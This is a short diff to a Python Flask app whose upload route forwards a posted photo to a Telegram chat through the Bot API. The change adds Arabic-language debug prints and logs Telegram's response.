@@ -8,11 +8,14 @@ CHAT_ID = '6325478675'
 
 @app.route('/upload', methods=['POST'])
 def upload():
+    print("🚀 وصلك طلب رفع صورة")
     file = request.files['photo']
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
     files = {'photo': file.stream}
     data = {'chat_id': CHAT_ID}
-    requests.post(url, files=files, data=data)
+    response = requests.post(url, files=files, data=data)
+    print("📸 رد تيليجرام:")
+    print(response.text)
     return 'تم الاستلام'
 
 import os
